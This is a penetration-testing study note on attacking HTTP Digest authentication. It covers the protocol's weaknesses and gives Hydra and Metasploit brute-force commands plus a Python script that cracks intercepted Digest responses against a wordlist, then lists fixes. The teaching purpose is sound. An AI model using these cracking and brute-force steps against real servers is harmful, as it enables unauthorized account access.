---
tags: [vapt, authentication, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.18 HTTP Digest Auth Attacks"
---

# 16.18 — HTTP Digest Authentication Attacks

## What Is HTTP Digest Auth?

```
DIGEST AUTH — IMPROVEMENT OVER BASIC AUTH:
  Does NOT send password in plaintext (not even base64)
  Instead: sends a HASH of the password + challenge values
  
FLOW:
  1. Client requests resource
  2. Server sends 401 + challenge:
     WWW-Authenticate: Digest realm="Admin", nonce="abc123xyz", algorithm="MD5"
     
  3. Client computes:
     HA1 = MD5(username:realm:password)
     HA2 = MD5(method:URI)
     response = MD5(HA1:nonce:HA2)
     
  4. Client sends computed response (NOT the password!)
     Authorization: Digest username="admin", realm="Admin",
                    nonce="abc123xyz", response="<hash>", ...
                    
  5. Server computes same hash server-side → compares!
     If match → authenticated
     
KEY POINT:
  Password never transmitted!
  But hash CAN be cracked offline if intercepted!
```

---

## Digest Auth Vulnerabilities

```
1. OFFLINE CRACKING:
   Intercept the Authorization header with response hash
   Try passwords: MD5(admin:realm:candidate) → see if it matches
   This is offline cracking — fast and unlimited attempts!
   
2. NONCE REUSE / WEAK NONCE:
   nonce should be unique per request and expire quickly
   If nonce is reused → replay attacks possible
   
3. MD5 DEPRECATION:
   Most Digest implementations use MD5 (algorithm=MD5)
   MD5 is cryptographically broken!
   Modern hardware: billions of MD5 ops per second
   → Cracking is fast!
   
4. DOWNGRADE TO BASIC AUTH:
   Some servers/clients fall back to Basic if Digest fails
   Attacker intercepts → sends fake 401 with Basic challenge
   → Client sends password in base64!
   
5. NO MUTUAL AUTHENTICATION (default):
   Client can't verify server identity in basic Digest
   → MITM possible (rogue server captures credentials)
```

---

## Capturing and Cracking Digest Hashes

```bash
# CAPTURE WITH BURP OR WIRESHARK:
# In Burp HTTP history → find Authorization: Digest header:
Authorization: Digest username="admin", realm="Admin Area",
  nonce="MTYwMDAwMDAwMA==", uri="/admin", 
  response="1f3870be274f6c49b3e31a0c6728957f"

# CRACK WITH HASHCAT:
# Format: username:realm:HA1_hash OR full challenge for full crack
# Hashcat mode 5500 (NetNTLMv1) or custom for pure Digest MD5

# BURP INTRUDER FOR ONLINE ATTACK:
# (Same as Basic Auth — try passwords, Burp handles the Digest header generation)
# Burp Intruder handles Digest auth automatically if configured!

# HYDRA:
hydra -l admin -P passwords.txt target.com http-get-form \
  "/admin:A=DIGEST:F=401"
# Note: Hydra has limited Digest support — test manually first

# METASPLOIT MODULE:
use auxiliary/scanner/http/http_login
set AUTH_URI /admin
set AUTH_TYPE Digest
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## Offline Hash Cracking

```python
# DIGEST RESPONSE COMPUTATION (for understanding / offline crack):
import hashlib

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def check_digest(username, realm, password, nonce, method, uri, response):
    ha1 = md5(f"{username}:{realm}:{password}")
    ha2 = md5(f"{method}:{uri}")
    expected = md5(f"{ha1}:{nonce}:{ha2}")
    return expected == response

# USAGE:
# Intercepted from traffic:
intercepted_response = "1f3870be274f6c49b3e31a0c6728957f"
nonce = "MTYwMDAwMDAwMA=="

# Try passwords from list:
for password in open("passwords.txt"):
    password = password.strip()
    if check_digest("admin", "Admin Area", password, nonce, "GET", "/admin", intercepted_response):
        print(f"[!] PASSWORD FOUND: {password}")
        break
```

---

## Fix

```
IMPROVING DIGEST AUTH:
  ✓ Use algorithm=SHA-256 or SHA-512 instead of MD5 (RFC 7616)
  ✓ Use qop=auth-int (includes message body in hash)
  ✓ Strong, random nonces with short expiry (prevent replay)
  ✓ Nonce count (nc) validation to prevent replay within same nonce
  ✓ Rate limit authentication attempts
  
BETTER ALTERNATIVES:
  ✓ Token-based auth (JWT Bearer, OAuth 2.0) for APIs
  ✓ Session-based login with strong CSRF protection for web apps
  ✓ TLS client certificates for very high security
```

---

## Related Notes
- [[17 - Basic Auth Cracking]] — simpler but weaker predecessor
- [[19 - NTLM Authentication Attacks]] — Windows challenge-response auth
- [[28 - Defense Rate Limiting Lockout MFA]] — defense guide
